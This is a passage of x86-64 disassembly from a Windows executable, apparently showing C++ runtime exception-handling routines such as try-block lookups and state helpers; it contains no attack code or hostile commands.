   1400041d1:	e8 4e fd ff ff       	call   0x140003f24
   1400041d6:	8b d3                	mov    %ebx,%edx
   1400041d8:	48 8b cf             	mov    %rdi,%rcx
   1400041db:	48 85 c0             	test   %rax,%rax
   1400041de:	74 0b                	je     0x1400041eb
   1400041e0:	44 8b c6             	mov    %esi,%r8d
   1400041e3:	ff 15 7f f1 00 00    	call   *0xf17f(%rip)        # 0x140013368
   1400041e9:	eb 06                	jmp    0x1400041f1
   1400041eb:	ff 15 c7 ef 00 00    	call   *0xefc7(%rip)        # 0x1400131b8
   1400041f1:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400041f6:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   1400041fb:	48 83 c4 20          	add    $0x20,%rsp
   1400041ff:	5f                   	pop    %rdi
   140004200:	c3                   	ret
   140004201:	cc                   	int3
   140004202:	cc                   	int3
   140004203:	cc                   	int3
   140004204:	48 8b c4             	mov    %rsp,%rax
   140004207:	4c 89 48 20          	mov    %r9,0x20(%rax)
   14000420b:	4c 89 40 18          	mov    %r8,0x18(%rax)
   14000420f:	48 89 50 10          	mov    %rdx,0x10(%rax)
   140004213:	48 89 48 08          	mov    %rcx,0x8(%rax)
   140004217:	53                   	push   %rbx
   140004218:	48 83 ec 60          	sub    $0x60,%rsp
   14000421c:	48 8b d9             	mov    %rcx,%rbx
   14000421f:	c7 40 d8 00 00 00 00 	movl   $0x0,-0x28(%rax)
   140004226:	48 89 48 e8          	mov    %rcx,-0x18(%rax)
   14000422a:	4c 89 40 f0          	mov    %r8,-0x10(%rax)
   14000422e:	e8 19 fb ff ff       	call   0x140003d4c
   140004233:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   140004238:	8b 0b                	mov    (%rbx),%ecx
   14000423a:	48 8b 40 10          	mov    0x10(%rax),%rax
   14000423e:	ff 15 24 f1 00 00    	call   *0xf124(%rip)        # 0x140013368
   140004244:	c7 44 24 40 00 00 00 	movl   $0x0,0x40(%rsp)
   14000424b:	00 
   14000424c:	eb 00                	jmp    0x14000424e
   14000424e:	8b 44 24 40          	mov    0x40(%rsp),%eax
   140004252:	48 83 c4 60          	add    $0x60,%rsp
   140004256:	5b                   	pop    %rbx
   140004257:	c3                   	ret
   140004258:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000425d:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140004262:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140004267:	57                   	push   %rdi
   140004268:	48 83 ec 20          	sub    $0x20,%rsp
   14000426c:	8b 79 0c             	mov    0xc(%rcx),%edi
   14000426f:	8b f2                	mov    %edx,%esi
   140004271:	48 8b e9             	mov    %rcx,%rbp
   140004274:	85 ff                	test   %edi,%edi
   140004276:	74 2b                	je     0x1400042a3
   140004278:	8d 5f ff             	lea    -0x1(%rdi),%ebx
   14000427b:	8b fb                	mov    %ebx,%edi
   14000427d:	e8 ca fa ff ff       	call   0x140003d4c
   140004282:	48 8d 14 9b          	lea    (%rbx,%rbx,4),%rdx
   140004286:	48 8b 40 60          	mov    0x60(%rax),%rax
   14000428a:	48 8d 0c 90          	lea    (%rax,%rdx,4),%rcx
   14000428e:	48 63 45 10          	movslq 0x10(%rbp),%rax
   140004292:	48 03 c1             	add    %rcx,%rax
   140004295:	3b 70 04             	cmp    0x4(%rax),%esi
   140004298:	7e 05                	jle    0x14000429f
   14000429a:	3b 70 08             	cmp    0x8(%rax),%esi
   14000429d:	7e 06                	jle    0x1400042a5
   14000429f:	85 db                	test   %ebx,%ebx
   1400042a1:	75 d5                	jne    0x140004278
   1400042a3:	33 c0                	xor    %eax,%eax
   1400042a5:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400042aa:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   1400042af:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   1400042b4:	48 83 c4 20          	add    $0x20,%rsp
   1400042b8:	5f                   	pop    %rdi
   1400042b9:	c3                   	ret
   1400042ba:	cc                   	int3
   1400042bb:	cc                   	int3
   1400042bc:	40 53                	rex push %rbx
   1400042be:	48 83 ec 20          	sub    $0x20,%rsp
   1400042c2:	48 8b da             	mov    %rdx,%rbx
   1400042c5:	48 8b d1             	mov    %rcx,%rdx
   1400042c8:	48 8b cb             	mov    %rbx,%rcx
   1400042cb:	e8 ac 05 00 00       	call   0x14000487c
   1400042d0:	8b d0                	mov    %eax,%edx
   1400042d2:	48 8b cb             	mov    %rbx,%rcx
   1400042d5:	e8 7e ff ff ff       	call   0x140004258
   1400042da:	48 85 c0             	test   %rax,%rax
   1400042dd:	0f 95 c0             	setne  %al
   1400042e0:	48 83 c4 20          	add    $0x20,%rsp
   1400042e4:	5b                   	pop    %rbx
   1400042e5:	c3                   	ret
   1400042e6:	cc                   	int3
   1400042e7:	cc                   	int3
   1400042e8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400042ed:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   1400042f2:	57                   	push   %rdi
   1400042f3:	48 83 ec 20          	sub    $0x20,%rsp
   1400042f7:	4c 8d 4c 24 48       	lea    0x48(%rsp),%r9
   1400042fc:	49 8b d8             	mov    %r8,%rbx
   1400042ff:	48 8b fa             	mov    %rdx,%rdi
   140004302:	e8 45 00 00 00       	call   0x14000434c
   140004307:	48 8b d7             	mov    %rdi,%rdx
   14000430a:	48 8b cb             	mov    %rbx,%rcx
   14000430d:	48 8b f0             	mov    %rax,%rsi
   140004310:	e8 67 05 00 00       	call   0x14000487c
   140004315:	8b d0                	mov    %eax,%edx
   140004317:	48 8b cb             	mov    %rbx,%rcx
   14000431a:	e8 39 ff ff ff       	call   0x140004258
   14000431f:	48 85 c0             	test   %rax,%rax
   140004322:	75 06                	jne    0x14000432a
   140004324:	41 83 c9 ff          	or     $0xffffffff,%r9d
   140004328:	eb 04                	jmp    0x14000432e
   14000432a:	44 8b 48 04          	mov    0x4(%rax),%r9d
   14000432e:	4c 8b c3             	mov    %rbx,%r8
   140004331:	48 8b d7             	mov    %rdi,%rdx
   140004334:	48 8b ce             	mov    %rsi,%rcx
   140004337:	e8 58 17 00 00       	call   0x140005a94
   14000433c:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140004341:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140004346:	48 83 c4 20          	add    $0x20,%rsp
   14000434a:	5f                   	pop    %rdi
   14000434b:	c3                   	ret
   14000434c:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140004351:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   140004356:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   14000435b:	57                   	push   %rdi
   14000435c:	41 54                	push   %r12
   14000435e:	41 55                	push   %r13
   140004360:	41 56                	push   %r14
   140004362:	41 57                	push   %r15
   140004364:	48 83 ec 20          	sub    $0x20,%rsp
   140004368:	41 8b 68 0c          	mov    0xc(%r8),%ebp
   14000436c:	4c 8b e9             	mov    %rcx,%r13
   14000436f:	49 8b c8             	mov    %r8,%rcx
   140004372:	49 8b f1             	mov    %r9,%rsi
   140004375:	4d 8b f8             	mov    %r8,%r15
   140004378:	4c 8b e2             	mov    %rdx,%r12
   14000437b:	e8 fc 04 00 00       	call   0x14000487c
   140004380:	4d 8b 55 00          	mov    0x0(%r13),%r10
   140004384:	44 8b f0             	mov    %eax,%r14d
   140004387:	4c 89 16             	mov    %r10,(%rsi)
   14000438a:	eb 6b                	jmp    0x1400043f7
   14000438c:	49 63 47 10          	movslq 0x10(%r15),%rax
   140004390:	8d 4d ff             	lea    -0x1(%rbp),%ecx
   140004393:	49 8b 7c 24 08       	mov    0x8(%r12),%rdi
   140004398:	8b e9                	mov    %ecx,%ebp
   14000439a:	48 8d 0c 89          	lea    (%rcx,%rcx,4),%rcx
   14000439e:	48 8d 1c 88          	lea    (%rax,%rcx,4),%rbx
   1400043a2:	44 3b 74 3b 04       	cmp    0x4(%rbx,%rdi,1),%r14d
   1400043a7:	7e 4e                	jle    0x1400043f7
   1400043a9:	44 3b 74 3b 08       	cmp    0x8(%rbx,%rdi,1),%r14d
   1400043ae:	7f 47                	jg     0x1400043f7
   1400043b0:	49 8b 0c 24          	mov    (%r12),%rcx
   1400043b4:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   1400043b9:	45 33 c0             	xor    %r8d,%r8d
   1400043bc:	ff 15 8e ed 00 00    	call   *0xed8e(%rip)        # 0x140013150
   1400043c2:	4c 63 44 3b 10       	movslq 0x10(%rbx,%rdi,1),%r8
   1400043c7:	33 c9                	xor    %ecx,%ecx
   1400043c9:	4c 03 44 24 50       	add    0x50(%rsp),%r8
   1400043ce:	44 8b 4c 3b 0c       	mov    0xc(%rbx,%rdi,1),%r9d
   1400043d3:	44 8b 10             	mov    (%rax),%r10d
   1400043d6:	45 85 c9             	test   %r9d,%r9d
   1400043d9:	74 17                	je     0x1400043f2
   1400043db:	49 8d 50 0c          	lea    0xc(%r8),%rdx
   1400043df:	48 63 02             	movslq (%rdx),%rax
   1400043e2:	49 3b c2             	cmp    %r10,%rax
   1400043e5:	74 16                	je     0x1400043fd
   1400043e7:	ff c1                	inc    %ecx
   1400043e9:	48 83 c2 14          	add    $0x14,%rdx
   1400043ed:	41 3b c9             	cmp    %r9d,%ecx
   1400043f0:	72 ed                	jb     0x1400043df
   1400043f2:	41 3b c9             	cmp    %r9d,%ecx
   1400043f5:	72 06                	jb     0x1400043fd
   1400043f7:	85 ed                	test   %ebp,%ebp
   1400043f9:	75 91                	jne    0x14000438c
   1400043fb:	eb 14                	jmp    0x140004411
   1400043fd:	49 8b 45 00          	mov    0x0(%r13),%rax
   140004401:	48 8d 0c 89          	lea    (%rcx,%rcx,4),%rcx
   140004405:	49 63 4c 88 10       	movslq 0x10(%r8,%rcx,4),%rcx
   14000440a:	48 8b 0c 01          	mov    (%rcx,%rax,1),%rcx
   14000440e:	48 89 0e             	mov    %rcx,(%rsi)
   140004411:	48 8b 5c 24 58       	mov    0x58(%rsp),%rbx
   140004416:	48 8b c6             	mov    %rsi,%rax
   140004419:	48 8b 74 24 68       	mov    0x68(%rsp),%rsi
   14000441e:	48 8b 6c 24 60       	mov    0x60(%rsp),%rbp
   140004423:	48 83 c4 20          	add    $0x20,%rsp
   140004427:	41 5f                	pop    %r15
   140004429:	41 5e                	pop    %r14
   14000442b:	41 5d                	pop    %r13
   14000442d:	41 5c                	pop    %r12
   14000442f:	5f                   	pop    %rdi
   140004430:	c3                   	ret
   140004431:	cc                   	int3
   140004432:	cc                   	int3
   140004433:	cc                   	int3
   140004434:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004439:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   14000443e:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140004443:	57                   	push   %rdi
   140004444:	41 54                	push   %r12
   140004446:	41 55                	push   %r13
   140004448:	41 56                	push   %r14
   14000444a:	41 57                	push   %r15
   14000444c:	48 83 ec 40          	sub    $0x40,%rsp
   140004450:	48 8b 9c 24 90 00 00 	mov    0x90(%rsp),%rbx
   140004457:	00 
   140004458:	4c 8b fa             	mov    %rdx,%r15
   14000445b:	48 8b f1             	mov    %rcx,%rsi
   14000445e:	49 8b d1             	mov    %r9,%rdx
   140004461:	48 8b cb             	mov    %rbx,%rcx
   140004464:	49 8b f9             	mov    %r9,%rdi
   140004467:	45 8b f0             	mov    %r8d,%r14d
   14000446a:	8b 6b 0c             	mov    0xc(%rbx),%ebp
   14000446d:	e8 0a 04 00 00       	call   0x14000487c
   140004472:	45 33 d2             	xor    %r10d,%r10d
   140004475:	44 8b c8             	mov    %eax,%r9d
   140004478:	85 ed                	test   %ebp,%ebp
   14000447a:	0f 84 e4 00 00 00    	je     0x140004564
   140004480:	48 8b 7f 08          	mov    0x8(%rdi),%rdi
   140004484:	41 83 cc ff          	or     $0xffffffff,%r12d
   140004488:	4c 63 5b 10          	movslq 0x10(%rbx),%r11
   14000448c:	45 8b c4             	mov    %r12d,%r8d
   14000448f:	45 8b ec             	mov    %r12d,%r13d
   140004492:	8b d5                	mov    %ebp,%edx
   140004494:	8d 42 ff             	lea    -0x1(%rdx),%eax
   140004497:	48 8d 0c 80          	lea    (%rax,%rax,4),%rcx
   14000449b:	8d 1a                	lea    (%rdx),%ebx
   14000449d:	8b d0                	mov    %eax,%edx
   14000449f:	48 8d 04 8f          	lea    (%rdi,%rcx,4),%rax
   1400044a3:	46 3b 4c 18 04       	cmp    0x4(%rax,%r11,1),%r9d
   1400044a8:	7e 0b                	jle    0x1400044b5
   1400044aa:	46 3b 4c 18 08       	cmp    0x8(%rax,%r11,1),%r9d
   1400044af:	0f 8e 9c 00 00 00    	jle    0x140004551
   1400044b5:	85 d2                	test   %edx,%edx
   1400044b7:	75 db                	jne    0x140004494
   1400044b9:	4d 8b ca             	mov    %r10,%r9
   1400044bc:	41 8b d2             	mov    %r10d,%edx
   1400044bf:	4a 8d 0c 1f          	lea    (%rdi,%r11,1),%rcx
   1400044c3:	4d 85 c9             	test   %r9,%r9
   1400044c6:	74 11                	je     0x1400044d9
   1400044c8:	41 8b 41 04          	mov    0x4(%r9),%eax
   1400044cc:	39 01                	cmp    %eax,(%rcx)
   1400044ce:	7e 1e                	jle    0x1400044ee
   1400044d0:	41 8b 41 08          	mov    0x8(%r9),%eax
   1400044d4:	39 41 04             	cmp    %eax,0x4(%rcx)
   1400044d7:	7f 15                	jg     0x1400044ee
   1400044d9:	44 3b 31             	cmp    (%rcx),%r14d
   1400044dc:	7c 10                	jl     0x1400044ee
   1400044de:	44 3b 71 04          	cmp    0x4(%rcx),%r14d
   1400044e2:	7f 0a                	jg     0x1400044ee
   1400044e4:	45 3b c4             	cmp    %r12d,%r8d
   1400044e7:	44 8b ea             	mov    %edx,%r13d
   1400044ea:	44 0f 44 c2          	cmove  %edx,%r8d
   1400044ee:	ff c2                	inc    %edx
   1400044f0:	48 83 c1 14          	add    $0x14,%rcx
   1400044f4:	3b d5                	cmp    %ebp,%edx
   1400044f6:	72 cb                	jb     0x1400044c3
   1400044f8:	41 8b c2             	mov    %r10d,%eax
   1400044fb:	4c 89 7c 24 20       	mov    %r15,0x20(%rsp)
   140004500:	4c 8d 5c 24 40       	lea    0x40(%rsp),%r11
   140004505:	4c 89 7c 24 30       	mov    %r15,0x30(%rsp)
   14000450a:	49 8b 5b 30          	mov    0x30(%r11),%rbx
   14000450e:	45 3b c4             	cmp    %r12d,%r8d
   140004511:	49 8b 6b 38          	mov    0x38(%r11),%rbp
   140004515:	41 0f 45 c0          	cmovne %r8d,%eax
   140004519:	89 44 24 28          	mov    %eax,0x28(%rsp)
   14000451d:	41 8d 45 01          	lea    0x1(%r13),%eax
   140004521:	0f 10 44 24 20       	movups 0x20(%rsp),%xmm0
   140004526:	44 0f 45 d0          	cmovne %eax,%r10d
   14000452a:	48 8b c6             	mov    %rsi,%rax
   14000452d:	44 89 54 24 38       	mov    %r10d,0x38(%rsp)
   140004532:	0f 10 4c 24 30       	movups 0x30(%rsp),%xmm1
   140004537:	f3 0f 7f 06          	movdqu %xmm0,(%rsi)
   14000453b:	f3 0f 7f 4e 10       	movdqu %xmm1,0x10(%rsi)
   140004540:	49 8b 73 40          	mov    0x40(%r11),%rsi
   140004544:	49 8b e3             	mov    %r11,%rsp
   140004547:	41 5f                	pop    %r15
   140004549:	41 5e                	pop    %r14
   14000454b:	41 5d                	pop    %r13
   14000454d:	41 5c                	pop    %r12
   14000454f:	5f                   	pop    %rdi
   140004550:	c3                   	ret
   140004551:	8d 43 ff             	lea    -0x1(%rbx),%eax
   140004554:	48 8d 04 80          	lea    (%rax,%rax,4),%rax
   140004558:	4c 8d 0c 87          	lea    (%rdi,%rax,4),%r9
   14000455c:	4d 03 cb             	add    %r11,%r9
   14000455f:	e9 58 ff ff ff       	jmp    0x1400044bc
   140004564:	e8 07 32 00 00       	call   0x140007770
   140004569:	cc                   	int3
   14000456a:	cc                   	int3
   14000456b:	cc                   	int3
   14000456c:	40 55                	rex push %rbp
   14000456e:	48 8d 6c 24 e1       	lea    -0x1f(%rsp),%rbp
   140004573:	48 81 ec e0 00 00 00 	sub    $0xe0,%rsp
   14000457a:	48 8b 05 bf 9a 01 00 	mov    0x19abf(%rip),%rax        # 0x14001e040
   140004581:	48 33 c4             	xor    %rsp,%rax
   140004584:	48 89 45 0f          	mov    %rax,0xf(%rbp)
   140004588:	4c 8b 55 77          	mov    0x77(%rbp),%r10
   14000458c:	48 8d 05 7d ff 00 00 	lea    0xff7d(%rip),%rax        # 0x140014510
   140004593:	0f 10 00             	movups (%rax),%xmm0
   140004596:	4c 8b d9             	mov    %rcx,%r11
   140004599:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   14000459e:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   1400045a2:	0f 11 01             	movups %xmm0,(%rcx)
   1400045a5:	0f 10 40 20          	movups 0x20(%rax),%xmm0
   1400045a9:	0f 11 49 10          	movups %xmm1,0x10(%rcx)
   1400045ad:	0f 10 48 30          	movups 0x30(%rax),%xmm1
   1400045b1:	0f 11 41 20          	movups %xmm0,0x20(%rcx)
   1400045b5:	0f 10 40 40          	movups 0x40(%rax),%xmm0
   1400045b9:	0f 11 49 30          	movups %xmm1,0x30(%rcx)
   1400045bd:	0f 10 48 50          	movups 0x50(%rax),%xmm1
   1400045c1:	0f 11 41 40          	movups %xmm0,0x40(%rcx)
   1400045c5:	0f 10 40 60          	movups 0x60(%rax),%xmm0
   1400045c9:	0f 11 49 50          	movups %xmm1,0x50(%rcx)
   1400045cd:	0f 10 88 80 00 00 00 	movups 0x80(%rax),%xmm1
   1400045d4:	0f 11 41 60          	movups %xmm0,0x60(%rcx)
   1400045d8:	0f 10 40 70          	movups 0x70(%rax),%xmm0
   1400045dc:	48 8b 80 90 00 00 00 	mov    0x90(%rax),%rax
   1400045e3:	0f 11 41 70          	movups %xmm0,0x70(%rcx)
   1400045e7:	0f 11 89 80 00 00 00 	movups %xmm1,0x80(%rcx)
   1400045ee:	48 89 81 90 00 00 00 	mov    %rax,0x90(%rcx)
   1400045f5:	48 8d 05 14 12 00 00 	lea    0x1214(%rip),%rax        # 0x140005810
   1400045fc:	49 8b 0b             	mov    (%r11),%rcx
   1400045ff:	48 89 45 8f          	mov    %rax,-0x71(%rbp)
   140004603:	48 8b 45 4f          	mov    0x4f(%rbp),%rax
   140004607:	48 89 45 9f          	mov    %rax,-0x61(%rbp)
   14000460b:	48 63 45 5f          	movslq 0x5f(%rbp),%rax
   14000460f:	48 89 45 a7          	mov    %rax,-0x59(%rbp)
   140004613:	48 8b 45 57          	mov    0x57(%rbp),%rax
   140004617:	48 89 45 b7          	mov    %rax,-0x49(%rbp)
   14000461b:	0f b6 45 7f          	movzbl 0x7f(%rbp),%eax
   14000461f:	48 89 45 c7          	mov    %rax,-0x39(%rbp)
   140004623:	49 8b 42 40          	mov    0x40(%r10),%rax
   140004627:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   14000462c:	49 8b 42 28          	mov    0x28(%r10),%rax
   140004630:	4c 89 4d 97          	mov    %r9,-0x69(%rbp)
   140004634:	45 33 c9             	xor    %r9d,%r9d
   140004637:	4c 89 45 af          	mov    %r8,-0x51(%rbp)
   14000463b:	4c 8d 44 24 30       	lea    0x30(%rsp),%r8
   140004640:	48 89 55 bf          	mov    %rdx,-0x41(%rbp)
   140004644:	49 8b 12             	mov    (%r10),%rdx
   140004647:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000464c:	48 c7 45 cf 20 05 93 	movq   $0x19930520,-0x31(%rbp)
   140004653:	19 
   140004654:	ff 15 2e eb 00 00    	call   *0xeb2e(%rip)        # 0x140013188
   14000465a:	48 8b 4d 0f          	mov    0xf(%rbp),%rcx
   14000465e:	48 33 cc             	xor    %rsp,%rcx
   140004661:	e8 ca c6 00 00       	call   0x140010d30
   140004666:	48 81 c4 e0 00 00 00 	add    $0xe0,%rsp
   14000466d:	5d                   	pop    %rbp
   14000466e:	c3                   	ret
   14000466f:	cc                   	int3
   140004670:	40 53                	rex push %rbx
   140004672:	48 83 ec 20          	sub    $0x20,%rsp
   140004676:	48 8b d9             	mov    %rcx,%rbx
   140004679:	48 89 11             	mov    %rdx,(%rcx)
   14000467c:	e8 cb f6 ff ff       	call   0x140003d4c
   140004681:	48 3b 58 58          	cmp    0x58(%rax),%rbx
   140004685:	73 0b                	jae    0x140004692
   140004687:	e8 c0 f6 ff ff       	call   0x140003d4c
   14000468c:	48 8b 48 58          	mov    0x58(%rax),%rcx
   140004690:	eb 02                	jmp    0x140004694
   140004692:	33 c9                	xor    %ecx,%ecx
   140004694:	48 89 4b 08          	mov    %rcx,0x8(%rbx)
   140004698:	e8 af f6 ff ff       	call   0x140003d4c
   14000469d:	48 89 58 58          	mov    %rbx,0x58(%rax)
   1400046a1:	48 8b c3             	mov    %rbx,%rax
   1400046a4:	48 83 c4 20          	add    $0x20,%rsp
   1400046a8:	5b                   	pop    %rbx
   1400046a9:	c3                   	ret
   1400046aa:	cc                   	int3
   1400046ab:	cc                   	int3
   1400046ac:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400046b1:	57                   	push   %rdi
   1400046b2:	48 83 ec 20          	sub    $0x20,%rsp
   1400046b6:	48 8b f9             	mov    %rcx,%rdi
   1400046b9:	e8 8e f6 ff ff       	call   0x140003d4c
   1400046be:	48 3b 78 58          	cmp    0x58(%rax),%rdi
   1400046c2:	75 35                	jne    0x1400046f9
   1400046c4:	e8 83 f6 ff ff       	call   0x140003d4c
   1400046c9:	48 8b 50 58          	mov    0x58(%rax),%rdx
   1400046cd:	48 85 d2             	test   %rdx,%rdx
   1400046d0:	74 27                	je     0x1400046f9
   1400046d2:	48 8b 5a 08          	mov    0x8(%rdx),%rbx
   1400046d6:	48 3b fa             	cmp    %rdx,%rdi
   1400046d9:	74 0a                	je     0x1400046e5
   1400046db:	48 8b d3             	mov    %rbx,%rdx
   1400046de:	48 85 db             	test   %rbx,%rbx
   1400046e1:	74 16                	je     0x1400046f9
   1400046e3:	eb ed                	jmp    0x1400046d2
   1400046e5:	e8 62 f6 ff ff       	call   0x140003d4c
   1400046ea:	48 89 58 58          	mov    %rbx,0x58(%rax)
   1400046ee:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400046f3:	48 83 c4 20          	add    $0x20,%rsp
   1400046f7:	5f                   	pop    %rdi
   1400046f8:	c3                   	ret
   1400046f9:	e8 72 30 00 00       	call   0x140007770
   1400046fe:	cc                   	int3
   1400046ff:	cc                   	int3
   140004700:	48 83 ec 28          	sub    $0x28,%rsp
   140004704:	e8 43 f6 ff ff       	call   0x140003d4c
   140004709:	48 8b 40 60          	mov    0x60(%rax),%rax
   14000470d:	48 83 c4 28          	add    $0x28,%rsp
   140004711:	c3                   	ret
   140004712:	cc                   	int3
   140004713:	cc                   	int3
   140004714:	48 83 ec 28          	sub    $0x28,%rsp
   140004718:	e8 2f f6 ff ff       	call   0x140003d4c
   14000471d:	48 8b 40 68          	mov    0x68(%rax),%rax
   140004721:	48 83 c4 28          	add    $0x28,%rsp
   140004725:	c3                   	ret
   140004726:	cc                   	int3
   140004727:	cc                   	int3
   140004728:	40 53                	rex push %rbx
   14000472a:	48 83 ec 20          	sub    $0x20,%rsp
   14000472e:	48 8b d9             	mov    %rcx,%rbx
   140004731:	e8 16 f6 ff ff       	call   0x140003d4c
   140004736:	48 89 58 60          	mov    %rbx,0x60(%rax)
   14000473a:	48 83 c4 20          	add    $0x20,%rsp
   14000473e:	5b                   	pop    %rbx
   14000473f:	c3                   	ret
   140004740:	40 53                	rex push %rbx
   140004742:	48 83 ec 20          	sub    $0x20,%rsp
   140004746:	48 8b d9             	mov    %rcx,%rbx
   140004749:	e8 fe f5 ff ff       	call   0x140003d4c
   14000474e:	48 89 58 68          	mov    %rbx,0x68(%rax)
   140004752:	48 83 c4 20          	add    $0x20,%rsp
   140004756:	5b                   	pop    %rbx
   140004757:	c3                   	ret
   140004758:	48 8b c4             	mov    %rsp,%rax
   14000475b:	48 89 58 10          	mov    %rbx,0x10(%rax)
   14000475f:	48 89 68 18          	mov    %rbp,0x18(%rax)
   140004763:	48 89 70 20          	mov    %rsi,0x20(%rax)
   140004767:	57                   	push   %rdi
   140004768:	48 83 ec 40          	sub    $0x40,%rsp
   14000476c:	49 8b 59 08          	mov    0x8(%r9),%rbx
   140004770:	49 8b f9             	mov    %r9,%rdi
   140004773:	49 8b f0             	mov    %r8,%rsi
   140004776:	48 89 50 08          	mov    %rdx,0x8(%rax)
   14000477a:	48 8b e9             	mov    %rcx,%rbp
   14000477d:	e8 ca f5 ff ff       	call   0x140003d4c
   140004782:	48 89 58 60          	mov    %rbx,0x60(%rax)
   140004786:	48 8b 5d 38          	mov    0x38(%rbp),%rbx
   14000478a:	e8 bd f5 ff ff       	call   0x140003d4c
   14000478f:	48 89 58 68          	mov    %rbx,0x68(%rax)
   140004793:	e8 b4 f5 ff ff       	call   0x140003d4c
   140004798:	48 8b 57 38          	mov    0x38(%rdi),%rdx
   14000479c:	4c 8b cf             	mov    %rdi,%r9
   14000479f:	4c 8b c6             	mov    %rsi,%r8
   1400047a2:	8b 0a                	mov    (%rdx),%ecx
   1400047a4:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   1400047a9:	48 03 48 60          	add    0x60(%rax),%rcx
   1400047ad:	33 c0                	xor    %eax,%eax
   1400047af:	88 44 24 38          	mov    %al,0x38(%rsp)
   1400047b3:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   1400047b8:	89 44 24 28          	mov    %eax,0x28(%rsp)
   1400047bc:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   1400047c1:	48 8b cd             	mov    %rbp,%rcx
   1400047c4:	e8 53 0f 00 00       	call   0x14000571c
   1400047c9:	48 8b 5c 24 58       	mov    0x58(%rsp),%rbx
   1400047ce:	48 8b 6c 24 60       	mov    0x60(%rsp),%rbp
   1400047d3:	48 8b 74 24 68       	mov    0x68(%rsp),%rsi
   1400047d8:	48 83 c4 40          	add    $0x40,%rsp
   1400047dc:	5f                   	pop    %rdi
   1400047dd:	c3                   	ret
   1400047de:	cc                   	int3
   1400047df:	cc                   	int3
   1400047e0:	48 83 ec 28          	sub    $0x28,%rsp
   1400047e4:	4d 63 48 1c          	movslq 0x1c(%r8),%r9
   1400047e8:	4d 8b d0             	mov    %r8,%r10
   1400047eb:	48 8b 01             	mov    (%rcx),%rax
   1400047ee:	41 8b 04 01          	mov    (%r9,%rax,1),%eax
   1400047f2:	83 f8 fe             	cmp    $0xfffffffe,%eax
   1400047f5:	75 0b                	jne    0x140004802
   1400047f7:	4c 8b 02             	mov    (%rdx),%r8
   1400047fa:	49 8b ca             	mov    %r10,%rcx
   1400047fd:	e8 82 00 00 00       	call   0x140004884
   140004802:	48 83 c4 28          	add    $0x28,%rsp
   140004806:	c3                   	ret
   140004807:	cc                   	int3
   140004808:	40 53                	rex push %rbx
   14000480a:	48 83 ec 20          	sub    $0x20,%rsp
   14000480e:	4c 8d 4c 24 40       	lea    0x40(%rsp),%r9
   140004813:	49 8b d8             	mov    %r8,%rbx
   140004816:	e8 31 fb ff ff       	call   0x14000434c
   14000481b:	48 8b 08             	mov    (%rax),%rcx
   14000481e:	48 63 43 1c          	movslq 0x1c(%rbx),%rax
   140004822:	48 89 4c 24 40       	mov    %rcx,0x40(%rsp)
   140004827:	8b 44 08 04          	mov    0x4(%rax,%rcx,1),%eax
   14000482b:	48 83 c4 20          	add    $0x20,%rsp
   14000482f:	5b                   	pop    %rbx
   140004830:	c3                   	ret
   140004831:	cc                   	int3
   140004832:	cc                   	int3
   140004833:	cc                   	int3
   140004834:	48 63 52 1c          	movslq 0x1c(%rdx),%rdx
   140004838:	48 8b 01             	mov    (%rcx),%rax
   14000483b:	44 89 04 02          	mov    %r8d,(%rdx,%rax,1)
   14000483f:	c3                   	ret
   140004840:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004845:	57                   	push   %rdi
   140004846:	48 83 ec 20          	sub    $0x20,%rsp
   14000484a:	41 8b f9             	mov    %r9d,%edi
   14000484d:	49 8b d8             	mov    %r8,%rbx
   140004850:	4c 8d 4c 24 40       	lea    0x40(%rsp),%r9
   140004855:	e8 f2 fa ff ff       	call   0x14000434c
   14000485a:	48 8b 08             	mov    (%rax),%rcx
   14000485d:	48 63 43 1c          	movslq 0x1c(%rbx),%rax
   140004861:	48 89 4c 24 40       	mov    %rcx,0x40(%rsp)
   140004866:	3b 7c 08 04          	cmp    0x4(%rax,%rcx,1),%edi
   14000486a:	7e 04                	jle    0x140004870
   14000486c:	89 7c 08 04          	mov    %edi,0x4(%rax,%rcx,1)
   140004870:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140004875:	48 83 c4 20          	add    $0x20,%rsp
   140004879:	5f                   	pop    %rdi
   14000487a:	c3                   	ret
   14000487b:	cc                   	int3
   14000487c:	4c 8b 02             	mov    (%rdx),%r8
   14000487f:	e9 00 00 00 00       	jmp    0x140004884
   140004884:	40 53                	rex push %rbx
   140004886:	48 83 ec 20          	sub    $0x20,%rsp
   14000488a:	49 8b d8             	mov    %r8,%rbx
   14000488d:	48 85 c9             	test   %rcx,%rcx
   140004890:	74 52                	je     0x1400048e4
   140004892:	4c 63 59 18          	movslq 0x18(%rcx),%r11
   140004896:	4c 8b 52 08          	mov    0x8(%rdx),%r10
   14000489a:	4b 8d 04 1a          	lea    (%r10,%r11,1),%rax
   14000489e:	48 85 c0             	test   %rax,%rax
   1400048a1:	74 41                	je     0x1400048e4
